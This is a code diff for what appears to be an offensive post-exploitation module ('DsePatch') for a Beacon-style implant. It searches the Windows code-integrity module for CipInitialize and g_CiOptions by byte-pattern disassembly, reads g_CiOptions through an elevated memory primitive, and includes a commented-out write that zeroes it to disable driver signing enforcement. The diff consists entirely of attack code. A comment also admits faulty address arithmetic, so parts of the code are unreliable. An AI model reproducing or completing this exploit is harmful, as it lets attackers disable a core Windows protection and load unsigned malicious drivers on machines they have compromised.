@@ -16,6 +16,72 @@
  *
  * Purpose:
  *
+ * Checks if its matching an instruction
+ * block.
+ *
+**/
+
+D_SEC( B ) ULONG DseIsInsBlock( _In_ PBYTE Ptr, _In_ ULONG Offset ) 
+{
+	ULONG	Off = Offset;
+	hde64s	Hde;
+
+	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
+
+	hde64_disasm( &Ptr[ Off ], &Hde );
+	if ( Hde.flags & F_ERROR ) {
+		return 0;
+	};
+	if ( Hde.len != 3 ) {
+		return 0;
+	};
+	if ( Ptr[ Off ] != 0x4C || Ptr[ Off + 1 ] != 0x8B ) {
+		return 0;
+	};
+	Off += Hde.len;
+
+	hde64_disasm( &Ptr[ Off ], &Hde );
+	if ( Hde.flags & F_ERROR ) {
+		return 0;
+	};
+	if ( Hde.len != 3 ) {
+		return 0;
+	};
+	if ( Ptr[ Off ] != 0x4C || Ptr[ Off + 1 ] != 0x8B ) {
+		return 0;
+	};
+	Off += Hde.len;
+
+	hde64_disasm( &Ptr[ Off ], &Hde );
+	if ( Hde.flags & F_ERROR ) {
+		return 0;
+	};
+	if ( Hde.len != 3 ) {
+		return 0;
+	};
+	if ( Ptr[ Off ] != 0x48 || Ptr[ Off + 1 ] != 0x8B ) { 
+		return 0;
+	};
+	Off += Hde.len;
+
+	hde64_disasm( &Ptr[ Off ], &Hde );
+	if ( Hde.flags & F_ERROR ) { 
+		return 0;
+	};
+	if ( Hde.len != 2 ) {
+		return 0;
+	};
+	if ( Ptr[ Off ] != 0x8B || Ptr[ Off + 1 ] != 0xCD ) {
+		return 0;
+	};
+
+	return Off + Hde.len;
+};
+
+/**
+ *
+ * Purpose:
+ *
  * Attempts to use the elevated thread to
  * disable driver signing enforcement.
  *
@@ -23,10 +89,8 @@
 
 D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api ) 
 {
+	PBYTE				Adr = 0;
 	ULONG				Opt = 0;
-	ULONG				Fir = 0;
-	ULONG				Rel = 0;
-	ULONG				Off = 0;
 	PBYTE				Ptr = NULL;
 	PVOID				Map = NULL;
 	PCHAR				Str = NULL;
@@ -72,31 +136,16 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 			if ( Map != NULL )
 			{
 				Ptr = PeGetFuncEat( Map, H_STR_CIINITIALIZE );
-				Rel = 0;
-				Off = 0;
 
 				if ( Ptr != NULL )
 				{
-					if ( Ver.dwBuildNumber < 16299 ) {
-						/* Before RS3! */
-						do 
-						{
-							hde64_disasm( &Ptr[ Off ], &Hde );
+					ULONG	Rel = 0;
+					ULONG	Off = 0;
+					ULONG	Ofk = 0;
 
-							if ( Hde.flags & F_ERROR ) {
-								break;
-							};
+					RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
 
-							if ( Hde.len == 5 ) {
-								if ( Ptr[ Off ] == 0xe9 ) {
-									Rel = *( LONG * )( U_PTR( Ptr ) + Off + 1 );
-									__debugbreak();
-									break;
-								};
-							};
-							Off += Hde.len;
-						} while ( Off < 256 );
-					} else {
+					if ( Ver.dwBuildNumber > 16299 ) {
 						do
 						{
 							hde64_disasm( &Ptr[ Off ], &Hde );
@@ -104,31 +153,39 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 							if ( Hde.flags & F_ERROR ) {
 								break;
 							};
+							if ( Hde.len == 3 ) {
+								Ofk = DseIsInsBlock( Ptr, Off );
 
-							if ( Hde.len == 5 ) {
-								if ( Ptr[ Off ] == 0xe8 ) { 
-									if ( Fir != 1 ) {
-										Fir = 1; continue;
+								if ( Ofk != 0 ) {
+									hde64_disasm( &Ptr[ Ofk ], &Hde );
+
+									if ( Hde.flags & F_ERROR ) {
+										break;
 									};
-									Rel = *( LONG * )( U_PTR( Ptr ) + Off + 1 );
-									__debugbreak();
-									break;
+									if ( Hde.len == 5 ) {
+										if ( Ptr[ Ofk ] == 0xE8 ) {
+											Off = Ofk;
+											Rel = *( ULONG * )( Ptr + Ofk + 1 );
+											break;
+										};
+									};
 								};
 							};
-							Off += Hde.len;
+							Off = Off + Hde.len;
 						} while ( Off < 256 );
-					};
-
-					if ( ! Rel ) {
-						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find CipInitialize." ) ) );
+					} else {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "sorry, havent ported a g_CiOptions search prior to RS3 yet." ) ) );
 						goto Leave;
 					};
 
-					Ptr = C_PTR( U_PTR( Ptr ) + U_PTR( Off ) + U_PTR( Hde.len ) + U_PTR( Rel ) );
+					Ptr = C_PTR( U_PTR( Ptr ) + Off + 5 + Rel );
 					Rel = 0;
 					Off = 0;
 
-					do 
+					BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!CipInitialize @ %p\n" ) ),
+							U_PTR( Inf->Module[ Idx ].ImageBase ) + U_PTR( Ptr ) - U_PTR( Map ) );
+
+					do
 					{
 						hde64_disasm( &Ptr[ Off ], &Hde );
 
@@ -137,29 +194,32 @@ D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 						};
 
 						if ( Hde.len == 6 ) {
-							if ( Ptr[ Off ] == 0x89 && Ptr[ Off + 1 ] == 0x0d ) {
+							if ( *( USHORT * )( Ptr + Off ) == 0x0d89 ) {
 								Rel = *( ULONG * )( Ptr + Off + 2 );
 								break;
 							};
 						};
-						Off += Hde.len;
+						Off = Off + Hde.len;
 					} while ( Off < 256 );
 
-					if ( ! Rel ) {
-						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find g_CiOptions" ) ) );
-						goto Leave;
-					};
+					Ptr = C_PTR( U_PTR( Ptr ) + Off + 6 + Rel );
+					Adr = C_PTR( U_PTR( Inf->Module[ Idx ].ImageBase ) + U_PTR( Ptr ) - U_PTR( Map ) );
+					Adr = C_PTR( U_PTR( Adr ) - 0x100000000 ); // fucked up some math here.
 
-					Ptr = C_PTR( U_PTR( Ptr ) + U_PTR( Off ) + U_PTR( Hde.len ) + U_PTR( Rel ) );
-					Ptr = C_PTR( U_PTR( Ptr ) - U_PTR( Map ) + U_PTR( Inf->Module[ Idx ].ImageBase ) );
-
-					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Ptr, &Opt, sizeof( Opt ), NULL ) ) {
-						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions @ 0x%p\n" ) ), Ptr );
+					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &Opt, sizeof( Opt ), NULL ) ) 
+					{
 						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions = 0x%x\n" ) ), Opt );
 
-						/* Set and reset! */
+						/*
+						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &( DWORD ){ 0x0 }, sizeof( DWORD ), NULL ) ) 
+						{
+							BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch disabled driver signing enforcement." ) ), 0x0 );
+						} else {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not disable driver signing enforcement." ) ) );
+							goto Leave;
+						}; */
 					} else {
-						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read g_CiOptions" ) ) );
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read g_CiOptions. exploit failed." ) ) );
 						goto Leave;
 					};
 				} else {
